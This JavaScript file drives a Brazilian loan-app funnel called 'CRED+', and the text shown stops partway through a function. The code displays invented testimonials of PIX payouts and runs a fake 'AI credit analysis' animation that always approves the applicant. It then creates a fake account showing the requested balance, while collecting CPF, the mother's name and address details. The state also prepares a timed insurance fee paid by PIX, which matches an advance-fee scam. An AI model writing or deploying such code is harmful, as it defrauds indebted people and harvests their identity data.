/**
 * CRED+ - Aplicação de Empréstimo Pessoal & Conta Digital
 * Arquitetura de Estados, Máscaras, Validações, Cálculos e Checkout PIX
 */

(function () {
  'use strict';

  // ==========================================
  // ESTADO GLOBAL DA APLICAÇÃO
  // ==========================================
  const state = {
    currentStep: 1,
    stepHistory: [1],
    // Simulação
    amount: 10000,
    installments: 12,
    monthlyRate: 0.0149, // 1,49% a.m. (19,4% a.a.) - Taxa diferenciada Cred+, bem abaixo da taxa bancária comum (~5,5% a 8,5% a.m.)
    installmentValue: 916.23,
    totalValue: 10994.75,
    
    // Dados Pessoais
    cpf: '',
    fullName: '',
    birthDate: '',
    motherName: '',
    gender: '',
    phone: '',

    // Perfil
    loanReason: '',
    occupation: '',
    isNegative: '',

    // Renda
    income: '',
    noIncome: false,
    incomeDay: null,

    // Endereço
    paymentDay: null,
    cep: '',
    street: '',
    number: '',
    noNumber: false,
    complement: '',
    neighborhood: '',
    city: '',
    stateUF: '',

    // Conta & Saque
    hideBalance: false,
    selectedBank: 'Nubank (Nu Pagamentos S.A.)',
    pixKeyType: 'CPF',
    pixKey: '',

    // Seguro & Checkout
    selectedQuote: 'standard', // 'standard' | 'turbo'
    quotePrice: 47.90,
    insuranceCountdown: 900, // 15:00
    countdownTimer: null,
    currentTxId: null,
    pollingTimer: null,
    pixCopiedCode: '',
    email: '',
    isContractSigned: false,
    orderBumps: {
      vip: false,
      extended: false
    }
  };

  // ==========================================
  // PROVA SOCIAL (NOTIFICAÇÕES FLUTUANTES)
  // ==========================================
  const socialProofList = [
    { name: 'Marcos V.', from: 'Salvador, BA', event: 'recebeu R$ 6.000,00 no PIX', time: 'agora mesmo' },
    { name: 'Fernanda L.', from: 'Rio de Janeiro, RJ', event: 'foi aprovada e recebeu R$ 3.500,00', time: 'há 2 min' },
    { name: 'José A.', from: 'Recife, PE', event: 'recebeu R$ 8.000,00 no PIX', time: 'há 4 min' },
    { name: 'Camila R.', from: 'Goiânia, GO', event: 'teve o crédito liberado em 3 minutos', time: 'agora mesmo' },
    { name: 'Paulo H.', from: 'Manaus, AM', event: 'foi aprovado e recebeu R$ 4.200,00', time: 'há 3 min' },
    { name: 'Aline T.', from: 'Porto Alegre, RS', event: 'recebeu R$ 2.900,00 no PIX', time: 'há 1 min' },
    { name: 'Ricardo S.', from: 'Fortaleza, CE', event: 'foi aprovado e recebeu R$ 5.000,00', time: 'há 5 min' },
    { name: 'Juliana M.', from: 'Belo Horizonte, MG', event: 'recebeu R$ 10.000,00 no PIX', time: 'agora mesmo' }
  ];

  let socialProofIndex = 0;

  // ==========================================
  // UTILITÁRIOS DE FORMATAÇÃO E CÁLCULO
  // ==========================================
  function formatBRL(val) {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL',
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(val);
  }

  function formatBRLNoSymbol(val) {
    return new Intl.NumberFormat('pt-BR', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(val);
  }

  function calculateLoan(amount, months, rate) {
    // PMT = L * (i * (1+i)^n) / ((1+i)^n - 1)
    const factor = Math.pow(1 + rate, months);
    const pmt = amount * (rate * factor) / (factor - 1);
    const total = pmt * months;
    return {
      pmt: Math.round(pmt * 100) / 100,
      total: Math.round(total * 100) / 100
    };
  }

  // ==========================================
  // NAVEGAÇÃO ENTRE PASSOS
  // ==========================================
  function goToStep(stepNumber, recordHistory = true) {
    if (stepNumber < 1 || stepNumber > 15) return;

    if (recordHistory && state.currentStep !== stepNumber) {
      state.stepHistory.push(stepNumber);
    }

    // Ocultar todos os passos
    document.querySelectorAll('.step-view').forEach(view => {
      view.classList.remove('active');
    });

    // Ativar o passo desejado
    const targetView = document.getElementById(`step-${stepNumber}`);
    if (targetView) {
      targetView.classList.add('active');
      state.currentStep = stepNumber;
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    updateHeaderAndProgress(stepNumber);
    handleStepInit(stepNumber);
  }

  function goBack() {
    if (state.stepHistory.length > 1) {
      state.stepHistory.pop(); // tira o atual
      const prevStep = state.stepHistory[state.stepHistory.length - 1];
      goToStep(prevStep, false);
    } else {
      goToStep(1, false);
    }
  }

  function updateHeaderAndProgress(step) {
    const backBtn = document.getElementById('headerBackBtn');
    const progressBar = document.getElementById('flowProgressBar');

    // Botão Voltar não aparece no dashboard (passo 11) ou no passo 1
    if (step === 1 || step === 11 || step === 15) {
      if (backBtn) backBtn.style.visibility = 'hidden';
    } else {
      if (backBtn) backBtn.style.visibility = 'visible';
    }

    // Progresso
    let pct = 10;
    if (step === 1) pct = 12;
    else if (step === 2) pct = 22;
    else if (step === 3) pct = 35;
    else if (step === 4) pct = 48;
    else if (step === 5) pct = 60;
    else if (step === 6) pct = 70;
    else if (step === 7) pct = 80;
    else if (step === 8) pct = 88;
    else if (step === 9) pct = 94;
    else if (step >= 10) pct = 100;

    if (progressBar) {
      progressBar.style.width = `${pct}%`;
    }
  }

  // ==========================================
  // INICIALIZAÇÃO ESPECÍFICA POR PASSO
  // ==========================================
  function handleStepInit(step) {
    if (step === 1) {
      updateSimulationUI();
    } else if (step === 6) {
      startCreditAnalysisAnimation();
    } else if (step === 7) {
      initApprovedStep();
      triggerConfetti();
    } else if (step === 10) {
      startAccountOpeningAnimation();
    } else if (step === 11) {
      initBankingDashboard();
    } else if (step === 13) {
      initInsuranceStep();
    } else if (step === 14) {
      initCheckoutPix();
    } else if (step === 15) {
      initReceiptStep();
    }
  }

  // ==========================================
  // PASSO 1: SIMULAÇÃO DE EMPRÉSTIMO
  // ==========================================
  function updateSimulationUI() {
    const calc = calculateLoan(state.amount, state.installments, state.monthlyRate);
    state.installmentValue = calc.pmt;
    state.totalValue = calc.total;

    // Atualizar labels do valor principal
    const amountValEl = document.getElementById('simAmountValue');
    if (amountValEl) amountValEl.textContent = formatBRLNoSymbol(state.amount);

    // Atualizar badge dinâmico da imagem do criativo (smartphone com valor aprovado em tempo real)
    const heroAmountEl = document.getElementById('heroAprovadoAmount');
    if (heroAmountEl) heroAmountEl.textContent = formatBRL(state.amount);

    const ctaBtn = document.getElementById('simContinueBtn');
    if (ctaBtn) {
      ctaBtn.innerHTML = `
        <span class="cta-arrow-icon">➔</span>
        <div class="cta-content-wrap">
          <span class="cta-headline">CLIQUE AQUI E FAÇA SUA SIMULAÇÃO GRÁTIS!</span>
          <span class="cta-subdetail">Liberar ${formatBRL(state.amount)} via PIX Imediato</span>
        </div>
        <div class="cta-pointer-cursor">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
            <path d="M4 3l14 8-6.5 2-3 8-4.5-18z" fill="#FFFFFF" stroke="#07162C" stroke-width="2.2" stroke-linejoin="round"/>
          </svg>
        </div>
      `;
    }

    const pmtValEl = document.getElementById('simPmtValue');
    if (pmtValEl) pmtValEl.textContent = formatBRL(calc.pmt);

    const totalValEl = document.getElementById('simTotalValue');
    if (totalValEl) totalValEl.textContent = `Total: ${formatBRL(calc.total)}`;

    // Atualizar o sub-valor mensal de cada botão de parcela (incluindo 36x e 48x do criativo)
    const allTerms = [6, 12, 18, 24, 36, 48];
    allTerms.forEach(t => {
      const termCalc = calculateLoan(state.amount, t, state.monthlyRate);
      const subValEl = document.getElementById(`instSubVal${t}`);
      if (subValEl) {
        subValEl.textContent = `${formatBRL(termCalc.pmt)}/mês`;
      }
    });

    // Atualizar data dinâmica da primeira parcela (45 dias à frente)
    const firstDate = new Date(Date.now() + 45 * 24 * 60 * 60 * 1000);
    const monthsPt = ['Janeiro', 'Fevereiro', 'Março', 'Abril', 'Maio', 'Junho', 'Julho', 'Agosto', 'Setembro', 'Outubro', 'Novembro', 'Dezembro'];
    const firstDateTextEl = document.getElementById('firstPayDateText');
    if (firstDateTextEl) {
      firstDateTextEl.textContent = `1ª parcela para ${firstDate.getDate()} de ${monthsPt[firstDate.getMonth()]} (em 45 dias)`;
    }

    // Atualizar preenchimento do range
    const rangeInput = document.getElementById('loanRange');
    if (rangeInput) {
      const min = parseInt(rangeInput.min, 10) || 1000;
      const max = parseInt(rangeInput.max, 10) || 20000;
      const percentage = Math.max(0, Math.min(100, ((state.amount - min) / (max - min)) * 100));
      rangeInput.style.background = `linear-gradient(to right, var(--primary) 0%, var(--primary) ${percentage}%, #142a4a ${percentage}%, #142a4a 100%)`;
      if (parseInt(rangeInput.value, 10) !== state.amount) {
        rangeInput.value = state.amount;
      }
    }

    // Atualizar estado ativo dos atalhos rápidos
    const pills = document.querySelectorAll('.quick-amount-pill');
    pills.forEach(pill => {
      const pAmt = parseInt(pill.dataset.amount, 10);
      if (pAmt === state.amount) {
        pill.classList.add('active');
      } else {
        pill.classList.remove('active');
      }
    });
  }

  function initStep1Events() {
    const rangeInput = document.getElementById('loanRange');
    if (rangeInput) {
      const handleRange = function (e) {
        const val = parseInt(e.target.value, 10);
        if (!isNaN(val) && val > 0) {
          state.amount = val;
          updateSimulationUI();
        }
      };
      rangeInput.addEventListener('input', handleRange);
      rangeInput.addEventListener('change', handleRange);
    }

    // Botões Stepper (- / +)
    const btnMinus = document.getElementById('stepperMinusBtn') || document.getElementById('btnMinusAmount');
    const btnPlus = document.getElementById('stepperPlusBtn') || document.getElementById('btnPlusAmount');

    if (btnMinus) {
      btnMinus.addEventListener('click', function () {
        state.amount = Math.max(1000, state.amount - 500);
        updateSimulationUI();
      });
    }

    if (btnPlus) {
      btnPlus.addEventListener('click', function () {
        state.amount = Math.min(20000, state.amount + 500);
        updateSimulationUI();
      });
    }

    // Atalhos Rápidos de Valores
    const pills = document.querySelectorAll('.quick-amount-pill');
    pills.forEach(pill => {
      pill.addEventListener('click', function () {
        state.amount = parseInt(this.dataset.amount, 10);
        updateSimulationUI();
      });
    });

    // Botões de parcelas
    const installmentBtns = document.querySelectorAll('.installment-btn');
    installmentBtns.forEach(btn => {
      btn.addEventListener('click', function () {
        installmentBtns.forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        state.installments = parseInt(this.dataset.installments, 10);
        updateSimulationUI();
      });
    });

    // Botão continuar
    const continueBtn = document.getElementById('simContinueBtn');
    if (continueBtn) {
      continueBtn.addEventListener('click', () => {
        goToStep(2);
      });
    }
  }

  // ==========================================
  // PASSO 2: INFORME SEU CPF
  // ==========================================
  function initStep2Events() {
    const cpfInput = document.getElementById('cpfInput');
    const cpfBtn = document.getElementById('cpfContinueBtn');

    if (cpfInput) {
      cpfInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '');
        if (v.length > 11) v = v.substring(0, 11);

        // Máscara 000.000.000-00
        if (v.length > 9) {
          v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
        } else if (v.length > 6) {
          v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        } else if (v.length > 3) {
          v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        }
        this.value = v;
        state.cpf = v;

        const clean = v.replace(/\D/g, '');
        if (cpfBtn) {
          cpfBtn.disabled = clean.length !== 11;
        }
      });
    }

    const cpfForm = document.getElementById('step2Form');
    if (cpfForm) {
      cpfForm.addEventListener('submit', function (e) {
        e.preventDefault();
        const clean = state.cpf.replace(/\D/g, '');
        if (clean.length === 11) {
          // Atualiza campo travado do passo 3
          const lockedCpfEl = document.getElementById('step3LockedCpf');
          if (lockedCpfEl) lockedCpfEl.value = state.cpf;

          // Se digitou um CPF diferente do anterior, limpa os campos para nova digitação
          if (state.lastSubmittedCpf && state.lastSubmittedCpf !== state.cpf) {
            state.fullName = '';
            state.birthDate = '';
            state.motherName = '';
            state.phone = '';
            state.email = '';
            const nIn = document.getElementById('step3Name');
            const bIn = document.getElementById('step3Birth');
            const mIn = document.getElementById('step3Mother');
            const pIn = document.getElementById('step3Phone');
            const eIn = document.getElementById('step3Email');
            if (nIn) nIn.value = '';
            if (bIn) bIn.value = '';
            if (mIn) mIn.value = '';
            if (pIn) pIn.value = '';
            if (eIn) eIn.value = '';
            document.querySelectorAll('.gender-chip').forEach(c => c.classList.remove('selected'));
            state.gender = '';
          }
          state.lastSubmittedCpf = state.cpf;
          goToStep(3);
        }
      });
    }
  }

  // ==========================================
  // PASSO 3: CONFIRME SEUS DADOS
  // ==========================================
  function initStep3Events() {
    const nameInput = document.getElementById('step3Name');
    const birthInput = document.getElementById('step3Birth');
    const motherInput = document.getElementById('step3Mother');
    const phoneInput = document.getElementById('step3Phone');
    const emailInput = document.getElementById('step3Email');

    if (nameInput) {
      nameInput.addEventListener('input', e => state.fullName = e.target.value);
    }
    if (emailInput) {
      emailInput.addEventListener('input', e => state.email = e.target.value.trim());
    }
    if (birthInput) {
      birthInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '').substring(0, 8);
        if (v.length > 4) {
          v = v.replace(/(\d{2})(\d{2})(\d{1,4})/, '$1/$2/$3');
        } else if (v.length > 2) {
          v = v.replace(/(\d{2})(\d{1,2})/, '$1/$2');
        }
        this.value = v;
        state.birthDate = v;
      });
    }
    if (motherInput) {
      motherInput.addEventListener('input', e => state.motherName = e.target.value);
    }
    if (phoneInput) {
      phoneInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '').substring(0, 11);
        if (v.length > 10) {
          v = v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
        } else if (v.length > 6) {
          v = v.replace(/(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
        } else if (v.length > 2) {
          v = v.replace(/(\d{2})(\d{0,5})/, '($1) $2');
        }
        this.value = v;
        state.phone = v;
      });
    }

    // Chips de Gênero
    const genderChips = document.querySelectorAll('.gender-chip');
    genderChips.forEach(chip => {
      chip.addEventListener('click', function () {
        genderChips.forEach(c => c.classList.remove('selected'));
        this.classList.add('selected');
        state.gender = this.dataset.gender;
      });
    });

    // Alterar CPF
    const changeCpfBtn = document.getElementById('step3ChangeCpf');
    if (changeCpfBtn) {
      changeCpfBtn.addEventListener('click', () => {
        goToStep(2);
      });
    }

    const step3Form = document.getElementById('step3Form');
    if (step3Form) {
      step3Form.addEventListener('submit', function (e) {
        e.preventDefault();
        state.fullName = (nameInput ? nameInput.value : '').trim();
        state.birthDate = (birthInput ? birthInput.value : '').trim();
        state.motherName = (motherInput ? motherInput.value : '').trim();
        state.phone = (phoneInput ? phoneInput.value : '').trim();
        state.email = (emailInput ? emailInput.value : '').trim();

        if (!state.fullName || state.fullName.length < 3) {
          alert('Por favor, informe seu nome completo.');
          nameInput && nameInput.focus();
          return;
        }
        if (!state.birthDate || state.birthDate.length < 10) {
          alert('Por favor, informe sua data de nascimento no formato DD/MM/AAAA.');
          birthInput && birthInput.focus();
          return;
        }
        if (!state.motherName || state.motherName.length < 3) {
          alert('Por favor, informe o nome completo da sua mãe.');
          motherInput && motherInput.focus();
          return;
        }
        if (!state.gender) {
          alert('Por favor, selecione seu gênero.');
          return;
        }
        if (!state.phone || state.phone.length < 14) {
          alert('Por favor, informe seu número de celular com DDD.');
          phoneInput && phoneInput.focus();
          return;
        }
        if (!state.email || !state.email.includes('@')) {
          alert('Por favor, informe seu e-mail para envio do contrato e comprovantes.');
          emailInput && emailInput.focus();
          return;
        }
        goToStep(4);
      });
    }
  }

  // ==========================================
  // PASSO 4: SOBRE SUA SITUAÇÃO / PERFIL
  // ==========================================
  function initStep4Events() {
    // Motivo
    const reasonBtns = document.querySelectorAll('.reason-btn');
    reasonBtns.forEach(btn => {
      btn.addEventListener('click', function () {
        reasonBtns.forEach(b => b.classList.remove('selected'));
        this.classList.add('selected');
        state.loanReason = this.dataset.value;
      });
    });

    // Ocupação
    const occBtns = document.querySelectorAll('.occ-btn');
    occBtns.forEach(btn => {
      btn.addEventListener('click', function () {
        occBtns.forEach(b => b.classList.remove('selected'));
        this.classList.add('selected');
        state.occupation = this.dataset.value;
      });
    });

    // Negativado
    const negBtns = document.querySelectorAll('.neg-btn');
    negBtns.forEach(btn => {
      btn.addEventListener('click', function () {
        negBtns.forEach(b => b.classList.remove('selected'));
        this.classList.add('selected');
        state.isNegative = this.dataset.value;
      });
    });

    const step4Form = document.getElementById('step4Form');
    if (step4Form) {
      step4Form.addEventListener('submit', function (e) {
        e.preventDefault();
        if (!state.loanReason) {
          alert('Por favor, selecione o motivo do seu empréstimo.');
          return;
        }
        if (!state.occupation) {
          alert('Por favor, selecione a sua ocupação.');
          return;
        }
        if (!state.isNegative) {
          alert('Por favor, informe se o seu nome está negativado.');
          return;
        }
        goToStep(5);
      });
    }
  }

  // ==========================================
  // PASSO 5: QUAL A SUA RENDA?
  // ==========================================
  function initStep5Events() {
    const incomeInput = document.getElementById('step5Income');
    const noIncomeCheck = document.getElementById('step5NoIncome');
    const dayInput = document.getElementById('step5PayDay');

    if (incomeInput) {
      incomeInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '');
        if (v === '') {
          this.value = '';
          state.income = '';
          return;
        }
        let num = parseInt(v, 10) / 100;
        this.value = formatBRL(num);
        state.income = this.value;
      });
    }

    if (noIncomeCheck) {
      noIncomeCheck.addEventListener('change', function () {
        state.noIncome = this.checked;
        if (this.checked && incomeInput) {
          incomeInput.value = 'R$ 0,00';
          incomeInput.disabled = true;
          state.income = 'R$ 0,00';
        } else if (incomeInput) {
          incomeInput.disabled = false;
          incomeInput.value = '';
          state.income = '';
        }
      });
    }

    if (dayInput) {
      dayInput.addEventListener('input', function () {
        let v = parseInt(this.value.replace(/\D/g, ''), 10);
        if (v > 31) v = 31;
        if (v < 1 && this.value !== '') v = 1;
        this.value = isNaN(v) ? '' : v;
        state.incomeDay = isNaN(v) ? null : v;
      });
    }

    const step5Form = document.getElementById('step5Form');
    if (step5Form) {
      step5Form.addEventListener('submit', function (e) {
        e.preventDefault();
        if (!state.noIncome && (!state.income || state.income === 'R$ 0,00')) {
          alert('Por favor, informe sua renda mensal aproximada.');
          incomeInput && incomeInput.focus();
          return;
        }
        if (!state.incomeDay) {
          alert('Por favor, informe o dia do mês que você recebe seu salário ou benefício.');
          dayInput && dayInput.focus();
          return;
        }
        goToStep(6);
      });
    }
  }

  // ==========================================
  // PASSO 6: ANÁLISE DE CRÉDITO COM IA (ANIMADA)
  // ==========================================
  function startCreditAnalysisAnimation() {
    const pctEl = document.getElementById('radarPercent');
    const circle = document.getElementById('radarCircleProgress');
    const checks = [
      document.getElementById('analysisCheck1'),
      document.getElementById('analysisCheck2'),
      document.getElementById('analysisCheck3'),
      document.getElementById('analysisCheck4')
    ];

    // Reset checks
    checks.forEach(c => {
      if (c) {
        c.className = 'analysis-check-item';
        const box = c.querySelector('.check-icon-box');
        if (box) box.innerHTML = '<div class="spinner-mini"></div>';
      }
    });

    if (checks[0]) checks[0].className = 'analysis-check-item active';

    let progress = 0;
    const circumference = 377; // 2 * PI * 60
    if (circle) circle.style.strokeDashoffset = circumference;

    // 80ms * 100 ticks = 8.000ms (~8 segundos de análise com IA)
    const timer = setInterval(() => {
      progress += 1;
      if (pctEl) pctEl.textContent = `${progress}%`;
      if (circle) {
        const offset = circumference - (progress / 100) * circumference;
        circle.style.strokeDashoffset = offset;
      }

      // Check 1: 25% (~2.0s)
      if (progress >= 25 && checks[0] && !checks[0].classList.contains('completed')) {
        checks[0].className = 'analysis-check-item completed';
        const box = checks[0].querySelector('.check-icon-box');
        if (box) box.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
        if (checks[1]) checks[1].className = 'analysis-check-item active';
      }

      // Check 2: 55% (~4.4s)
      if (progress >= 55 && checks[1] && !checks[1].classList.contains('completed')) {
        checks[1].className = 'analysis-check-item completed';
        const box = checks[1].querySelector('.check-icon-box');
        if (box) box.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
        if (checks[2]) checks[2].className = 'analysis-check-item active';
      }

      // Check 3: 80% (~6.4s)
      if (progress >= 80 && checks[2] && !checks[2].classList.contains('completed')) {
        checks[2].className = 'analysis-check-item completed';
        const box = checks[2].querySelector('.check-icon-box');
        if (box) box.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
        if (checks[3]) checks[3].className = 'analysis-check-item active';
      }

      // Check 4: 100% (~8.0s)
      if (progress >= 100) {
        clearInterval(timer);
        if (checks[3]) {
          checks[3].className = 'analysis-check-item completed';
          const box = checks[3].querySelector('.check-icon-box');
          if (box) box.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
        }
        setTimeout(() => {
          goToStep(7);
        }, 750);
      }
    }, 80);
  }

  // ==========================================
  // PASSO 7: CRÉDITO APROVADO COM CONFETES
  // ==========================================
  function initApprovedStep() {
    const firstName = state.fullName.trim() ? state.fullName.trim().split(' ')[0] : 'Cliente';
    const greetingEl = document.getElementById('approvedGreeting');
    if (greetingEl) greetingEl.textContent = `🎉 Parabéns, ${firstName}!`;

    const amountEl = document.getElementById('approvedAmountDisplay');
    if (amountEl) amountEl.textContent = formatBRL(state.amount);

    const termEl = document.getElementById('approvedTermDisplay');
    if (termEl) termEl.textContent = `${state.installments}x de ${formatBRL(state.installmentValue)}`;

    const durationEl = document.getElementById('approvedDurationDisplay');
    if (durationEl) durationEl.textContent = `${state.installments} meses`;

    const btn = document.getElementById('approvedContinueBtn');
    if (btn) {
      btn.onclick = () => goToStep(8);
    }
  }

  function triggerConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const pieces = [];
    const colors = ['#00D26A', '#00F59B', '#22E785', '#3B82F6', '#60A5FA', '#FBBF24', '#FFFFFF'];

    for (let i = 0; i < 90; i++) {
      pieces.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height * 0.3 - canvas.height * 0.2,
        size: Math.random() * 8 + 4,
        color: colors[Math.floor(Math.random() * colors.length)],
        speedY: Math.random() * 3 + 2,
        speedX: (Math.random() - 0.5) * 2,
        rotation: Math.random() * 360,
        rotationSpeed: (Math.random() - 0.5) * 6
      });
    }

    let animationFrame;
    let frames = 0;

    function render() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      pieces.forEach(p => {
        ctx.save();
        ctx.translate(p.x, p.y);
        ctx.rotate((p.rotation * Math.PI) / 180);
        ctx.fillStyle = p.color;
        ctx.fillRect(-p.size / 2, -p.size / 2, p.size, p.size * 0.6);
        ctx.restore();

        p.y += p.speedY;
        p.x += p.speedX;
        p.rotation += p.rotationSpeed;
      });

      frames++;
      if (frames < 240) {
        animationFrame = requestAnimationFrame(render);
      } else {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
      }
    }

    render();
  }

  // ==========================================
  // PASSO 8: MELHOR DIA PARA PAGAR
  // ==========================================
  function initStep8Events() {
    const dayCards = document.querySelectorAll('.day-card-btn');
    dayCards.forEach(card => {
      card.addEventListener('click', function () {
        dayCards.forEach(c => c.classList.remove('selected'));
        this.classList.add('selected');
        state.paymentDay = parseInt(this.dataset.day, 10);
      });
    });

    const continueBtn = document.getElementById('step8ContinueBtn');
    if (continueBtn) {
      continueBtn.addEventListener('click', () => {
        if (!state.paymentDay) {
          alert('Por favor, selecione o melhor dia para pagar suas parcelas.');
          return;
        }
        goToStep(9);
      });
    }
  }

  // ==========================================
  // PASSO 9: ENDEREÇO DE COBRANÇA (COM VIACEP)
  // ==========================================
  function initStep9Events() {
    const cepInput = document.getElementById('step9Cep');
    const streetInput = document.getElementById('step9Street');
    const numberInput = document.getElementById('step9Number');
    const noNumberCheck = document.getElementById('step9NoNumber');
    const compInput = document.getElementById('step9Complement');
    const neighInput = document.getElementById('step9Neighborhood');
    const cityInput = document.getElementById('step9City');
    const ufInput = document.getElementById('step9UF');
    const cepStatus = document.getElementById('cepLookupStatus');

    if (cepInput) {
      cepInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '').substring(0, 8);
        if (v.length > 5) {
          v = v.replace(/(\d{5})(\d{1,3})/, '$1-$2');
        }
        this.value = v;
        state.cep = v;

        // Se digitou 8 números, faz busca no ViaCEP
        const clean = v.replace(/\D/g, '');
        if (clean.length === 8) {
          if (cepStatus) cepStatus.textContent = 'Buscando CEP...';
          fetch(`https://viacep.com.br/ws/${clean}/json/`)
            .then(res => res.json())
            .then(data => {
              if (!data.erro) {
                if (streetInput) streetInput.value = data.logradouro || '';
                if (neighInput) neighInput.value = data.bairro || '';
                if (cityInput) cityInput.value = data.localidade || '';
                if (ufInput) ufInput.value = data.uf || '';
                state.street = data.logradouro;
                state.neighborhood = data.bairro;
                state.city = data.localidade;
                state.stateUF = data.uf;
                if (cepStatus) cepStatus.textContent = '✓ Endereço localizado';
                if (numberInput) numberInput.focus();
              } else {
                if (cepStatus) cepStatus.textContent = 'CEP não encontrado.';
              }
            })
            .catch(() => {
              if (cepStatus) cepStatus.textContent = '';
            });
        } else {
          if (cepStatus) cepStatus.textContent = '';
        }
      });
    }

    if (noNumberCheck) {
      noNumberCheck.addEventListener('change', function () {
        state.noNumber = this.checked;
        if (numberInput) {
          numberInput.disabled = this.checked;
          numberInput.value = this.checked ? 'S/N' : '';
        }
      });
    }

    const step9Form = document.getElementById('step9Form');
    if (step9Form) {
      step9Form.addEventListener('submit', function (e) {
        e.preventDefault();
        state.cep = (cepInput ? cepInput.value : '').trim();
        state.street = (streetInput ? streetInput.value : '').trim();
        state.number = (numberInput ? numberInput.value : '').trim();
        state.complement = (compInput ? compInput.value : '').trim();
        state.neighborhood = (neighInput ? neighInput.value : '').trim();
        state.city = (cityInput ? cityInput.value : '').trim();
        state.stateUF = (ufInput ? ufInput.value : '').trim();

        if (!state.cep || state.cep.length < 9) {
          alert('Por favor, informe um CEP válido.');
          cepInput && cepInput.focus();
          return;
        }
        if (!state.street) {
          alert('Por favor, informe a rua ou logradouro.');
          streetInput && streetInput.focus();
          return;
        }
        if (!state.noNumber && !state.number) {
          alert('Por favor, informe o número da residência ou marque "Sem número".');
          numberInput && numberInput.focus();
          return;
        }
        if (!state.neighborhood) {
          alert('Por favor, informe o bairro.');
          neighInput && neighInput.focus();
          return;
        }
        if (!state.city) {
          alert('Por favor, informe a cidade.');
          cityInput && cityInput.focus();
          return;
        }
        if (!state.stateUF) {
          alert('Por favor, informe a UF do estado.');
          ufInput && ufInput.focus();
          return;
        }
        goToStep(10);
      });
    }
  }

  // ==========================================
  // PASSO 10: CRIAÇÃO DA CONTA DIGITAL
  // ==========================================
  function startAccountOpeningAnimation() {
    const bar = document.getElementById('accountLoadingBar');
    const statusText = document.getElementById('accountLoadingStatusText');

    if (statusText) {
      statusText.textContent = 'Liberando seu saldo aprovado e gerando acesso seguro...';
    }

    if (bar) {
      bar.style.width = '0%';
      setTimeout(() => {
        bar.style.width = '100%';
      }, 50);
    }

    // Etapas progressivas durante os 8+ segundos
    setTimeout(() => {
      if (statusText) statusText.textContent = 'Provisionando agência digital e chave de segurança criptografada...';
    }, 2400);

    setTimeout(() => {
      const formatted = formatBRL(state.amount);
      if (statusText) statusText.textContent = `Vinculando saldo aprovado de ${formatted} à conta Cred+...`;
    }, 5000);

    setTimeout(() => {
      if (statusText) statusText.textContent = 'Finalizando credenciais e liberando acesso bancário...';
    }, 7200);

    setTimeout(() => {
      goToStep(11);
    }, 8300);
  }

  // ==========================================
  // PASSO 11: HOME BANKING / CONTA DIGITAL CRED+
  // ==========================================
  function initBankingDashboard() {
    const firstName = state.fullName.trim() ? state.fullName.trim().split(' ')[0] : 'Cliente';
    const userGreetingEl = document.getElementById('dashboardUserGreeting');
    if (userGreetingEl) userGreetingEl.textContent = firstName;

    const avatarEl = document.getElementById('dashboardUserAvatar');
    if (avatarEl) avatarEl.textContent = firstName.charAt(0).toUpperCase() || 'C';

    const balanceEl = document.getElementById('dashboardBalance');
    if (balanceEl) balanceEl.textContent = formatBRL(state.amount);

    const transAmountEl = document.getElementById('dashboardTransAmount');
    if (transAmountEl) transAmountEl.textContent = `+${formatBRL(state.amount)}`;

    // Botão de Olho (mostrar/ocultar saldo)
    const toggleEyeBtn = document.getElementById('dashboardToggleBalance');
    if (toggleEyeBtn) {
      toggleEyeBtn.onclick = function () {
        state.hideBalance = !state.hideBalance;
        if (balanceEl) {
          balanceEl.textContent = state.hideBalance ? '••••••' : formatBRL(state.amount);
        }
      };
    }

    // Ações de Saque
    const withdrawBtn = document.getElementById('dashboardWithdrawCta');
    const pixTileBtn = document.getElementById('dashboardPixTile');
    if (withdrawBtn) withdrawBtn.onclick = openPixModal;
    if (pixTileBtn) pixTileBtn.onclick = openPixModal;
  }

  // ==========================================
  // PASSO 12: MODAL DE SAQUE PIX
  // ==========================================
  function openPixModal() {
    const modal = document.getElementById('pixModal');
    if (!modal) return;

    const modalAmountEl = document.getElementById('modalPixAmountDisplay');
    if (modalAmountEl) modalAmountEl.textContent = formatBRL(state.amount);

    const keyInput = document.getElementById('modalPixKeyInput');
    if (keyInput) {
      if (state.pixKeyType === 'CPF' && state.cpf) {
        keyInput.value = state.cpf;
        state.pixKey = state.cpf;
      } else {
        keyInput.value = state.pixKey || '';
      }
    }

    modal.classList.add('open');
  }

  function closePixModal() {
    const modal = document.getElementById('pixModal');
    if (modal) modal.classList.remove('open');
  }

  function initPixModalEvents() {
    const closeBtn = document.getElementById('modalCloseBtn');
